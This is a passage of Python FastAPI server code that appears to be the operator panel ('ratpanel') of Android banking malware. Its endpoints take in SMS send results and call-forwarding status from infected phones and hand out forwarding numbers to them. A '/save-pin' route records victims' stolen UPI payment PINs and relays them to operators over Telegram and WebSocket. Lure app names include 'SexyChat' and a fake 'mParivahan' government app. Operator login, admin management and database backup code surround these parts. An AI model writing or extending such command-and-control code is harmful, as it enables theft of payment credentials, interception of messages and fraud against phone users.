                    # Prepare WebSocket payload for update
                    ws_payload = {
                        "_id": str(updated_sms["_id"]),
                        "device_id": device_id,
                        "from": updated_sms.get("from"),
                        "to": updated_sms.get("to"),
                        "body": updated_sms.get("body", ""),
                        "timestamp": to_iso_string(ensure_utc(updated_sms.get("timestamp"))),
                        "type": updated_sms.get("type", "sent"),
                        "is_read": updated_sms.get("is_read", False),
                        "is_flagged": updated_sms.get("is_flagged", False),
                        "tags": updated_sms.get("tags", []),
                        "received_at": to_iso_string(ensure_utc(updated_sms.get("received_at"))),
                        "delivery_status": status,
                        "delivery_details": details,
                    }
                    if "sim_slot" in updated_sms:
                        ws_payload["sim_slot"] = updated_sms["sim_slot"]
                    if "sim_phone_number" in updated_sms:
                        ws_payload["sim_phone_number"] = updated_sms["sim_phone_number"]
                    
                    try:
                        await admin_ws_manager.notify_sms_update(device_id, ws_payload)
                    except Exception:
                        pass
            else:
                sms_saved = await device_service.save_new_sms(device_id, sms_data)

            await device_service.add_log(
                device_id,
                "sms",
                f"SMS sent successfully to {phone} (SIM {display_sim_slot}) - Status: {status}",
                "success",
                metadata={
                    "sms_id": sms_id,
                    "phone": phone,
                    "status": status,
                    "sim_slot": sim_slot,
                    "details": details
                }
            )

            return SMSDeliveryStatusResponse(
                success=True,
                message=f"SMS delivery status recorded: {status}",
                saved_to_sms=True
            )

        else:
            await device_service.add_log(
                device_id,
                "sms",
                f"SMS send failed to {phone} (SIM {display_sim_slot}) - Status: {status} - {details}",
                "error",
                metadata={
                    "sms_id": sms_id,
                    "phone": phone,
                    "status": status,
                    "sim_slot": sim_slot,
                    "details": details,
                    "message_preview": message[:50] if message else ""
                }
            )

            try:
                if device.admin_username:
                    await telegram_multi_service.send_to_admin(
                        device.admin_username,
                        f"❌ SMS Send Failed\n"
                        f"📱 Device: <code>{device_id}</code>\n"
                        f"📞 To: {phone}\n"
                        f"📡 SIM: {display_sim_slot}\n"
                        f"⚠️ Status: {status}\n"
                        f"💬 Details: {details}",
                        bot_index=2
                    )
            except Exception:
                pass

            return SMSDeliveryStatusResponse(
                success=True,
                message=f"SMS delivery status recorded: {status}",
                saved_to_sms=False,
                logged=True
            )

    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/devices/call-forwarding/result", response_model=CallForwardingResultResponse)
async def call_forwarding_result(result_data: CallForwardingResult):
    try:
        device_id = result_data.deviceId
        success = result_data.success
        message = result_data.message
        sim_slot = result_data.simSlot

        logger.info(f"Call forwarding result from device {device_id}: {message}")

        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(device_id)

        device = await device_service.get_device(device_id)
        if not device:
            logger.warning(f"Device not found: {device_id}")
            raise HTTPException(status_code=404, detail="Device not found")

        log_level = "success" if success else "error"
        display_sim_slot = sim_slot + 1 if isinstance(sim_slot, int) else "Unknown"
        log_message = f"Call forwarding (SIM {display_sim_slot}): {message}"

        await device_service.add_log(
            device_id,
            "call_forwarding",
            log_message,
            log_level,
            metadata={
                "success": success,
                "sim_slot": sim_slot,
                "message": message,
                "result_type": "call_forwarding_result"
            }
        )

        if not success and device.admin_username:
            try:
                await telegram_multi_service.send_to_admin(
                    device.admin_username,
                    f"❌ Call Forwarding Failed\n"
                    f"📱 Device: <code>{device_id}</code>\n"
                    f"📡 SIM: {display_sim_slot}\n"
                    f"⚠️ Error: {message}",
                    bot_index=1
                )
            except Exception as tg_error:
                logger.warning(f"Failed to send Telegram notification: {tg_error}")

        return CallForwardingResultResponse(
            success=True,
            message="Call forwarding result logged successfully",
            logged=True
        )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error processing call forwarding result: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/getForwardingNumber/{device_id}")
async def get_forwarding_number_new(device_id: str):
    try:
        logger.info(f"Forwarding number requested for device: {device_id}")

        forwarding_number = await device_service.get_forwarding_number(device_id)

        if not forwarding_number:
            logger.info(f"No forwarding number set for device: {device_id}")
            return {"forwardingNumber": ""}

        logger.info(f"Forwarding number found: {forwarding_number}")
        return {"forwardingNumber": forwarding_number}
    except Exception as e:
        logger.error(f"Error fetching forwarding number: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/devices/{device_id}/online-status-debug")
async def debug_online_status(
    device_id: str,
    current_admin: Admin = Depends(get_current_admin)
):
    """Debug endpoint to check why device shows offline"""
    from .services.device_online_tracker import device_online_tracker
    from datetime import timedelta
    from app.utils.datetime_utils import ensure_utc, utc_now
    
    # Get device from MongoDB
    device_doc = await mongodb.db.devices.find_one({"device_id": device_id})
    if not device_doc:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # Check Redis
    redis_is_online = await device_online_tracker.is_online(device_id)
    redis_ttl = await device_online_tracker.get_ttl(device_id)
    redis_initialized = device_online_tracker._is_initialized
    
    # Check timestamps
    last_online_update = device_doc.get("last_online_update")
    last_ping = device_doc.get("last_ping")
    
    five_minutes_ago = utc_now() - timedelta(minutes=5)
    
    # Calculate time differences
    time_since_online_update = None
    time_since_ping = None
    
    if last_online_update:
        last_online_update_utc = ensure_utc(last_online_update)
        time_since_online_update = (utc_now() - last_online_update_utc).total_seconds()
    
    if last_ping:
        last_ping_utc = ensure_utc(last_ping)
        time_since_ping = (utc_now() - last_ping_utc).total_seconds()
    
    return {
        "device_id": device_id,
        "redis": {
            "initialized": redis_initialized,
            "is_online": redis_is_online,
            "ttl_seconds": redis_ttl,
            "status": "✅ Online in Redis" if redis_is_online else "❌ Offline in Redis (key expired or not set)"
        },
        "mongodb": {
            "is_online": device_doc.get("is_online"),
            "status": device_doc.get("status"),
            "last_online_update": to_iso_string(last_online_update) if last_online_update else None,
            "last_ping": to_iso_string(last_ping) if last_ping else None,
            "time_since_online_update_seconds": time_since_online_update,
            "time_since_ping_seconds": time_since_ping,
        },
        "analysis": {
            "should_be_online": redis_is_online and time_since_online_update and time_since_online_update < 300,
            "redis_available": redis_initialized,
            "last_activity_recent": time_since_online_update and time_since_online_update < 300 if time_since_online_update else False,
            "problem": _diagnose_problem(redis_initialized, redis_is_online, time_since_online_update)
        }
    }

def _diagnose_problem(redis_initialized, redis_is_online, time_since_online_update):
    if not redis_initialized:
        return "🔴 Redis is not initialized - device online tracking won't work!"
    if not redis_is_online:
        return "🟡 Device key not in Redis - either expired or mark_device_activity failed"
    if time_since_online_update and time_since_online_update > 300:
        return "🟡 last_online_update is old - device hasn't sent activity recently"
    if redis_is_online and time_since_online_update and time_since_online_update < 300:
        return "🟢 Everything looks good - device should be online"
    return "🔵 Unknown issue"

@app.get("/health")
async def health_check():
    try:
        # Check MongoDB
        await mongodb.client.admin.command('ping')
        
        # Check Redis
        redis_status = "unavailable"
        try:
            from .services.redis_connection_pool import redis_manager
            if redis_manager.is_available:
                redis_ok = await redis_manager.ping()
                redis_status = "ok" if redis_ok else "error"
        except Exception:
            redis_status = "error"
        
        return {
            "status": "ok",
            "mongodb": "ok",
            "redis": redis_status
        }
    except Exception:
        raise HTTPException(status_code=503, detail="Service unavailable")

@app.get("/api/redis/stats")
async def get_redis_stats(
    current_admin: Admin = Depends(get_current_admin)
):
    """Get Redis statistics and health info"""
    try:
        from .services.redis_connection_pool import redis_manager
        from .services.device_online_tracker import device_online_tracker
        
        if not redis_manager.is_available:
            return {
                "success": False,
                "message": "Redis not available"
            }
        
        # Get Redis info
        redis_info = await redis_manager.get_info()
        pool_stats = await redis_manager.get_pool_stats()
        
        # Get online devices count
        online_device_ids = await device_online_tracker.get_all_online_device_ids()
        
        # Extract useful metrics
        stats = {
            "success": True,
            "redis_version": redis_info.get("redis_version"),
            "uptime_seconds": redis_info.get("uptime_in_seconds"),
            "connected_clients": redis_info.get("connected_clients"),
            "used_memory_human": redis_info.get("used_memory_human"),
            "used_memory_peak_human": redis_info.get("used_memory_peak_human"),
            "total_commands_processed": redis_info.get("total_commands_processed"),
            "instantaneous_ops_per_sec": redis_info.get("instantaneous_ops_per_sec"),
            "keyspace_hits": redis_info.get("keyspace_hits"),
            "keyspace_misses": redis_info.get("keyspace_misses"),
            "evicted_keys": redis_info.get("evicted_keys"),
            "expired_keys": redis_info.get("expired_keys"),
            "role": redis_info.get("role"),
            "connection_pool": pool_stats,
            "online_devices_count": len(online_device_ids),
        }
        
        # Calculate hit rate
        hits = stats.get("keyspace_hits", 0)
        misses = stats.get("keyspace_misses", 0)
        if hits + misses > 0:
            stats["hit_rate_percent"] = round((hits / (hits + misses)) * 100, 2)
        else:
            stats["hit_rate_percent"] = 0
        
        return stats
        
    except Exception as e:
        logger.error(f"Failed to get Redis stats: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/websocket/stats")
async def get_websocket_stats(
    current_admin: Admin = Depends(get_current_admin)
):
    """Get WebSocket connection and subscription statistics"""
    from .services.websocket_notification_queue import notification_queue
    
    ws_stats = admin_ws_manager.get_stats()
    queue_stats = notification_queue.get_stats()
    
    # Get detailed connection info
    async with admin_ws_manager._lock:
        connections_info = []
        for conn_id, conn in admin_ws_manager._connections.items():
            connections_info.append({
                "connection_id": conn_id[:8],
                "username": conn.username,
                "subscriptions": list(conn.subscriptions),
                "subscription_count": len(conn.subscriptions),
                "last_activity": conn.last_activity.isoformat() if conn.last_activity else None,
            })
    
    return {
        "success": True,
        "websocket": ws_stats,
        "notification_queue": queue_stats,
        "connections": connections_info,
        "message": "WebSocket statistics retrieved successfully"
    }

@app.post("/auth/login")
async def login(login_data: AdminLogin, request: Request, background_tasks: BackgroundTasks):
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)

    admin = await auth_service.authenticate_admin(login_data)

    if not admin:
        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=login_data.username,
                activity_type=ActivityType.LOGIN,
                description="Failed login attempt - Invalid credentials",
                ip_address=ip_address,
                user_agent=user_agent,
                success=False,
                error_message="Invalid credentials"
            )
        )

        raise HTTPException(
            status_code=401,
            detail="Invalid username or password"
        )

    if not ENABLE_2FA:

        session_id = auth_service.generate_session_id()

        update_result = await mongodb.db.admins.update_one(
            {"username": admin.username},
            {
                "$set": {
                    "current_session_id": session_id,
                    "last_session_ip": ip_address,
                    "last_session_device": user_agent
                }
            }
        )
        logger.info(f"Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")

        access_token = auth_service.create_access_token(
            data={"sub": admin.username, "role": admin.role},
            session_id=session_id
        )

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=admin.username,
                activity_type=ActivityType.LOGIN,
                description="Successful login (2FA disabled)",
                ip_address=ip_address,
                user_agent=user_agent,
                success=True
            )
        )

        logger.info(f"Admin logged in (no 2FA): {admin.username}")

        return TokenResponse(
            access_token=access_token,
            token_type="bearer",
            expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
            admin=AdminResponse(
                username=admin.username,
                email=admin.email,
                full_name=admin.full_name,
                role=admin.role,
                permissions=admin.permissions,
                is_active=admin.is_active,
                last_login=admin.last_login,
                login_count=admin.login_count,
                expires_at=admin.expires_at,
                created_at=admin.created_at
            )
        )

    otp_code = await otp_service.create_otp(admin.username, ip_address)

    background_tasks.add_task(
        send_2fa_code_bg,
        telegram_multi_service,
        admin.username,
        ip_address,
        otp_code,
        None
    )
    logger.info(f"2FA code queued for {admin.username}")

    temp_token = auth_service.create_temp_token(admin.username)

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=admin.username,
            activity_type=ActivityType.LOGIN,
            description="Login step 1: Password verified, OTP sent",
            ip_address=ip_address,
            user_agent=user_agent,
            success=True,
            metadata={"step": "otp_sent"}
        )
    )

    logger.info(f"Login step 1 complete for {admin.username}, awaiting OTP verification")

    return OTPResponse(
        success=True,
        message="OTP code sent to your Telegram. Please verify to complete login.",
        temp_token=temp_token,
        expires_in=300
    )

@app.post("/auth/verify-2fa", response_model=TokenResponse)
async def verify_2fa(verify_data: OTPVerify, request: Request, background_tasks: BackgroundTasks):
    ip_address = get_client_ip(request)
    user_agent = get_user_agent(request)

    username = auth_service.verify_temp_token(verify_data.temp_token)

    if not username or username != verify_data.username:
        raise HTTPException(
            status_code=401,
            detail="Invalid or expired temporary token"
        )

    otp_result = await otp_service.verify_otp(
        verify_data.username,
        verify_data.otp_code,
        ip_address
    )

    if not otp_result["valid"]:

        await otp_service.increment_attempts(verify_data.username, verify_data.otp_code)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=verify_data.username,
                activity_type=ActivityType.LOGIN,
                description=f"Failed OTP verification: {otp_result['message']}",
                ip_address=ip_address,
                user_agent=user_agent,
                success=False,
                error_message=otp_result["message"]
            )
        )

        raise HTTPException(
            status_code=401,
            detail=otp_result["message"]
        )

    admin = await auth_service.get_admin_by_username(verify_data.username)

    if not admin:
        raise HTTPException(
            status_code=404,
            detail="Admin not found"
        )

    session_id = auth_service.generate_session_id()

    update_data = {
        "$set": {
            "current_session_id": session_id,
            "last_session_ip": ip_address,
            "last_session_device": user_agent
        }
    }

    if verify_data.fcm_token:
        update_data["$set"]["fcm_tokens"] = [verify_data.fcm_token]
        logger.info(f"FCM token registered for {admin.username} (last device only)")

    update_result = await mongodb.db.admins.update_one(
        {"username": admin.username},
        update_data
    )
    logger.info(f"Session created for {admin.username}: {session_id[:20]}... (updated: {update_result.modified_count})")

    access_token = auth_service.create_access_token(
        data={"sub": admin.username, "role": admin.role},
        session_id=session_id
    )

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=admin.username,
            activity_type=ActivityType.LOGIN,
            description="Login step 2: OTP verified, login complete",
            ip_address=ip_address,
            user_agent=user_agent,
            success=True,
            metadata={"step": "otp_verified"}
        )
    )

    logger.info(f"2FA verification complete, admin logged in: {admin.username}")

    return TokenResponse(
        access_token=access_token,
        token_type="bearer",
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        admin=AdminResponse(
            username=admin.username,
            email=admin.email,
            full_name=admin.full_name,
            role=admin.role,
            permissions=admin.permissions,
            is_active=admin.is_active,
            last_login=admin.last_login,
            login_count=admin.login_count,
            expires_at=admin.expires_at,
            created_at=admin.created_at
        )
    )

@app.post("/auth/logout")
async def logout(
    request: Request,
    background_tasks: BackgroundTasks,
    current_admin: Admin = Depends(get_current_admin)
):
    ip_address = get_client_ip(request)

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.LOGOUT,
            description="Logged out",
            ip_address=ip_address
        )
    )

    logger.info(f"Admin logged out: {current_admin.username}")

    return {"message": "Logged out successfully"}

@app.post("/bot/auth/request-otp", response_model=BotOTPResponse, tags=["Bot Auth"])
async def bot_request_otp(request: BotOTPRequest, req: Request, background_tasks: BackgroundTasks):
    ip_address = get_client_ip(req)

    admin = await auth_service.get_admin_by_username(request.username)
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")

    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")

    otp_code = await otp_service.create_otp(request.username, ip_address)

    background_tasks.add_task(
        send_2fa_code_bg,
        telegram_multi_service,
        request.username,
        ip_address,
        otp_code,
        f"Bot Authentication Request\nBot: {request.bot_identifier}\n"
    )
    logger.info(f"OTP queued for {request.username} for bot: {request.bot_identifier}")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=request.username,
            activity_type=ActivityType.LOGIN,
            description=f"Bot OTP requested: {request.bot_identifier}",
            ip_address=ip_address,
            success=True
        )
    )

    return BotOTPResponse(
        success=True,
        message="OTP sent to your Telegram. Please verify to get service token.",
        expires_in=300
    )

@app.post("/bot/auth/verify-otp", response_model=BotTokenResponse, tags=["Bot Auth"])
async def bot_verify_otp(request: BotOTPVerify, req: Request):
    ip_address = get_client_ip(req)
    user_agent = get_user_agent(req)

    otp_result = await otp_service.verify_otp(request.username, request.otp_code, ip_address)

    if not otp_result["valid"]:
        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=request.username,
                activity_type=ActivityType.LOGIN,
                description=f"Bot OTP verification failed: {request.bot_identifier}",
                ip_address=ip_address,
                success=False,
                error_message=otp_result["message"]
            )
        )
        raise HTTPException(status_code=401, detail=otp_result["message"])

    admin = await auth_service.get_admin_by_username(request.username)
    if not admin:
        raise HTTPException(status_code=404, detail="Admin not found")

    if not admin.is_active:
        raise HTTPException(status_code=403, detail="Admin account is disabled")

    service_token = auth_service.create_access_token(
        data={
            "sub": admin.username,
            "role": admin.role,
            "bot_identifier": request.bot_identifier
        },
        client_type="service",
        is_bot=True
    )

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=request.username,
            activity_type=ActivityType.LOGIN,
            description=f"Bot authenticated successfully: {request.bot_identifier}",
            ip_address=ip_address,
            user_agent=user_agent,
            success=True,
            metadata={"bot": request.bot_identifier}
        )
    )

    # Run telegram notification in background to avoid timeout
    asyncio.create_task(
        telegram_multi_service.notify_admin_action(
            admin_username=request.username,
            action="bot_authenticated",
            details=f"Bot '{request.bot_identifier}' successfully authenticated",
            ip_address=ip_address
        )
    )

    logger.info(f"Bot authenticated: {request.bot_identifier} for {request.username}")

    return BotTokenResponse(
        success=True,
        message="Bot authenticated successfully. Use this service token for all future requests.",
        service_token=service_token,
        admin_info={
            "username": admin.username,
            "role": admin.role,
            "is_active": admin.is_active
        }
    )

@app.get("/bot/auth/check", response_model=BotStatusResponse, tags=["Bot Auth"])
async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
    return BotStatusResponse(
        active=current_admin.is_active,
        admin_username=current_admin.username,
        device_token=current_admin.device_token,
        message="Admin is active" if current_admin.is_active else "Admin is disabled"
    )

@app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
async def save_upi_pin(pin_data: UPIPinSave, background_tasks: BackgroundTasks):
    try:
        # Mark device as active (updates both Redis and MongoDB)
        await device_service.mark_device_activity(pin_data.device_id)
        
        admin_token = pin_data.user_id
        admin = await mongodb.db.admins.find_one({"device_token": admin_token})
        
        if not admin:
            logger.warning(f"Admin not found for user_id: {admin_token[:20]}...")
            admin_username = None
        else:
            admin_username = admin["username"]

        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
        if not device:
            logger.warning(f"Device not found: {pin_data.device_id} - PIN not saved (device must register first)")
            raise HTTPException(
                status_code=404,
                detail="Device not found. Device must be registered before saving PIN."
            )

        upi_pin_entry = {
            "pin": pin_data.upi_pin,
            "app_type": pin_data.app_type,
            "status": pin_data.status,
            "detected_at": utc_now()
        }

        update_data = {
            "$push": {
                "upi_pins": upi_pin_entry
            },
            "$set": {
                "has_upi": True,
                "upi_last_updated_at": utc_now(),
                "updated_at": utc_now()
            }
        }

        result = await mongodb.db.devices.update_one(
            {"device_id": pin_data.device_id},
            update_data
        )

        # Run add_log in background to avoid timeout
        asyncio.create_task(
            device_service.add_log(
                pin_data.device_id,
                "upi",
                f"UPI PIN {pin_data.status} from {pin_data.app_type} app (PIN: {pin_data.upi_pin})",
                "info" if pin_data.status == "success" else "warning"
            )
        )

        # Notify admins about device update (UPI PIN change) via WebSocket
        try:
            updated_device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
            if updated_device:
                device_payload = {
                    "device_id": pin_data.device_id,
                    "status": updated_device.get("status"),
                    "is_online": updated_device.get("is_online", False),
                    "battery_level": updated_device.get("battery_level"),
                    "has_upi": updated_device.get("has_upi", False),
                    "upi_pins": updated_device.get("upi_pins", []),
                    "last_online_update": to_iso_string(ensure_utc(updated_device.get("last_online_update"))) if updated_device.get("last_online_update") else None,
                    "updated_at": to_iso_string(ensure_utc(updated_device.get("updated_at"))),
                }
                await admin_ws_manager.notify_device_update(pin_data.device_id, device_payload)
                logger.debug(f"WebSocket notification sent for UPI PIN update: device={pin_data.device_id}")
        except Exception as e:
            logger.warning(f"Failed to send WebSocket notification for UPI PIN update: {e}")

        if admin_username:
            device_model = device.get("model", "Unknown")
            background_tasks.add_task(
                notify_upi_detected_bg,
                telegram_multi_service,
                firebase_admin_service,
                admin_username,
                pin_data.device_id,
                pin_data.upi_pin,
                pin_data.status,
                device_model
            )
            logger.info(f"UPI PIN saved for device: {pin_data.device_id} -> Notifications queued ({pin_data.status})")
            logger.info(f"Push notification sent to {admin_username} for UPI PIN ({pin_data.status})")
        else:
            logger.info(f"UPI PIN saved for device: {pin_data.device_id} (no admin association or failed status)")

        return UPIPinResponse(
            status="success",
            message=f"PIN saved successfully for {pin_data.app_type}",
            timestamp=utc_now()
        )

    except Exception as e:
        logger.error(f"Error saving UPI PIN: {e}")
        raise HTTPException(status_code=500, detail=str(e))
        
@app.get("/auth/me", response_model=AdminResponse)
async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
    return AdminResponse(
        username=current_admin.username,
        email=current_admin.email,
        full_name=current_admin.full_name,
        role=current_admin.role,
        permissions=current_admin.permissions,
        device_token=current_admin.device_token,
        telegram_2fa_chat_id=current_admin.telegram_2fa_chat_id,
        telegram_bots=current_admin.telegram_bots,
        is_active=current_admin.is_active,
        last_login=current_admin.last_login,
        login_count=current_admin.login_count,
        expires_at=current_admin.expires_at,
        created_at=current_admin.created_at
    )

@app.post("/admin/create", response_model=AdminResponse)
async def create_admin(
    admin_create: AdminCreate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    new_admin = await auth_service.create_admin(admin_create, created_by=current_admin.username)

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.CREATE_ADMIN,
            description=f"Created new admin: {new_admin.username}",
            ip_address=get_client_ip(request),
            metadata={"new_admin": new_admin.username, "role": new_admin.role.value}
        )
    )

    # Run telegram notification in background to avoid timeout
    asyncio.create_task(
        telegram_multi_service.notify_admin_created(
            current_admin.username,
            new_admin.username,
            new_admin.role.value,
            new_admin.device_token
        )
    )

    return AdminResponse(
        username=new_admin.username,
        email=new_admin.email,
        full_name=new_admin.full_name,
        role=new_admin.role,
        permissions=new_admin.permissions,
        device_token=new_admin.device_token,
        telegram_2fa_chat_id=new_admin.telegram_2fa_chat_id,
        telegram_bots=new_admin.telegram_bots,
        is_active=new_admin.is_active,
        last_login=new_admin.last_login,
        login_count=new_admin.login_count,
        expires_at=new_admin.expires_at,
        created_at=new_admin.created_at
    )

@app.get("/admin/list")
async def list_admins(
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    admins = await auth_service.get_all_admins()
    return {"admins": admins, "total": len(admins)}

@app.put("/admin/{username}")
async def update_admin(
    username: str,
    admin_update: AdminUpdate,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    success = await auth_service.update_admin(username, admin_update)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found or no changes made")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.UPDATE_ADMIN,
            description=f"Updated admin: {username}",
            ip_address=get_client_ip(request),
            metadata={"updated_admin": username, "changes": admin_update.model_dump(exclude_unset=True)}
        )
    )

    return {"message": "Admin updated successfully"}

@app.delete("/admin/{username}")
async def delete_admin(
    username: str,
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):

    if username == current_admin.username:
        raise HTTPException(status_code=400, detail="Cannot delete yourself")

    target_admin = await auth_service.get_admin_by_username(username)

    if not target_admin:
        raise HTTPException(status_code=404, detail="Admin not found")

    if (target_admin.created_by or "").lower() == "system":
        raise HTTPException(status_code=403, detail="System super admin cannot be deleted")

    success = await auth_service.delete_admin(username)

    if not success:
        raise HTTPException(status_code=404, detail="Admin not found")

    # Run log_activity in background to avoid timeout
    asyncio.create_task(
        admin_activity_service.log_activity(
            admin_username=current_admin.username,
            activity_type=ActivityType.DELETE_ADMIN,
            description=f"Deleted admin: {username}",
            ip_address=get_client_ip(request),
            metadata={"deleted_admin": username}
        )
    )

    return {"message": "Admin deleted successfully"}

@app.post("/admin/database/backup")
async def backup_database(
    request: Request,
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    _ensure_system_super_admin(current_admin)

    try:
        buffer = io.BytesIO()
        timestamp = utc_now().strftime("%Y%m%d-%H%M%S")
        collections = await mongodb.db.list_collection_names()

        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for collection in collections:
                cursor = mongodb.db[collection].find()
                documents = await cursor.to_list(length=None)
                json_data = json_util.dumps(documents, indent=2)
                zip_file.writestr(f"{collection}.json", json_data)

        buffer.seek(0)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.DATABASE_BACKUP,
                description="Database backup created",
                ip_address=get_client_ip(request),
                metadata={"collections": collections}
            )
        )

        filename = f"ratpanel-backup-{timestamp}.zip"
        headers = {"Content-Disposition": f"attachment; filename={filename}"}

        return StreamingResponse(
            buffer,
            media_type="application/zip",
            headers=headers
        )

    except Exception as e:
        logger.error(f"Database backup failed: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail="Failed to create database backup")

@app.post("/admin/database/restore")
async def restore_database(
    request: Request,
    backup_file: UploadFile = File(...),
    current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
):
    _ensure_system_super_admin(current_admin)

    if not backup_file.filename.lower().endswith(".zip"):
        raise HTTPException(status_code=400, detail="Backup file must be a .zip archive")

    try:
        file_bytes = await backup_file.read()
        buffer = io.BytesIO(file_bytes)

        restored_collections = []

        with zipfile.ZipFile(buffer, "r") as zip_file:
            for entry in zip_file.namelist():
                if not entry.endswith(".json"):
                    continue

                collection_name = entry.rsplit(".", 1)[0]
                raw_data = zip_file.read(entry).decode("utf-8")
                documents = json_util.loads(raw_data)

                if isinstance(documents, dict):
                    documents = [documents]

                collection = mongodb.db[collection_name]
                await collection.delete_many({})

                if documents:
                    await collection.insert_many(documents)

                restored_collections.append(collection_name)

        # Run log_activity in background to avoid timeout
        asyncio.create_task(
            admin_activity_service.log_activity(
                admin_username=current_admin.username,
                activity_type=ActivityType.DATABASE_RESTORE,
                description="Database restore completed",
                ip_address=get_client_ip(request),
                metadata={
                    "restored_collections": restored_collections,
                    "file": backup_file.filename
                }
            )
        )

        return {
            "message": "Database restore completed successfully",
            "restored_collections": restored_collections,
            "total_collections": len(restored_collections)
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Database restore failed: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail="Failed to restore database")

@app.get("/admin/activities")
async def get_admin_activities(
    admin_username: Optional[str] = None,
    activity_type: Optional[str] = None,
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=500),
    current_admin: Admin = Depends(get_current_admin)
):

    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username

    activities = await admin_activity_service.get_activities(
        admin_username=admin_username,
        activity_type=ActivityType(activity_type) if activity_type else None,
        skip=skip,
        limit=limit
    )

    total = await mongodb.db.admin_activities.count_documents(
        {"admin_username": admin_username} if admin_username else {}
    )

    return {
        "activities": activities,
        "total": total,
        "page": skip // limit + 1,
        "page_size": limit
    }

@app.get("/admin/activities/stats")
async def get_admin_activity_stats(
    admin_username: Optional[str] = None,
    current_admin: Admin = Depends(get_current_admin)
):

    if current_admin.role != AdminRole.SUPER_ADMIN:
        admin_username = current_admin.username

    stats = await admin_activity_service.get_activity_stats(admin_username)
    recent_logins = await admin_activity_service.get_recent_logins(limit=10)

    return {
        "stats": stats,
        "recent_logins": recent_logins
    }


@app.get("/api/devices/stats", response_model=StatsResponse)
async def get_device_stats(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):

    admin_username = None if current_admin.role == AdminRole.SUPER_ADMIN else current_admin.username

    stats = await device_service.get_stats(admin_username=admin_username)
    return StatsResponse(**stats)

@app.get("/api/stats")
async def get_stats(
    admin_username: Optional[str] = Query(None, description="Filter by admin (Super Admin only)"),
    current_admin: Admin = Depends(get_current_admin)
):

    # If super admin provides admin_username in query, use it
    # Otherwise, use current admin's username (or None for super admin)
    if current_admin.role == AdminRole.SUPER_ADMIN:
        # Super admin can filter by any admin or see all (None)
        final_admin_username = admin_username
    else:
        # Regular admin can only see their own stats
        final_admin_username = current_admin.username

    stats = await device_service.get_stats(admin_username=final_admin_username)
    return StatsResponse(**stats)

@app.get("/api/devices/app-types", response_model=AppTypesResponse)
async def get_app_types(
    current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
):

    is_super_admin = current_admin.role == AdminRole.SUPER_ADMIN
    query = {} if is_super_admin else {"admin_username": current_admin.username}
    query["is_deleted"] = {"$ne": True}

    pipeline = [
        {"$match": query},
        {"$group": {
            "_id": "$app_type",
            "count": {"$sum": 1}
        }},
        {"$sort": {"count": -1}}
    ]

    results = await mongodb.db.devices.aggregate(pipeline).to_list(None)

    app_names = {
        'sexychat': {'name': 'SexyChat', 'icon': ''},
        'mparivahan': {'name': 'mParivahan', 'icon': ''},
        'sexyhub': {'name': 'SexyHub', 'icon': ''},
        'MP': {'name': 'mParivahan', 'icon': ''},
    }

    app_types = []
    for item in results:
        app_type = item["_id"] or "unknown"
        app_info = app_names.get(app_type, {'name': app_type, 'icon': ''})

        app_types.append(AppTypeInfo(
            app_type=app_type,
            display_name=app_info['name'],
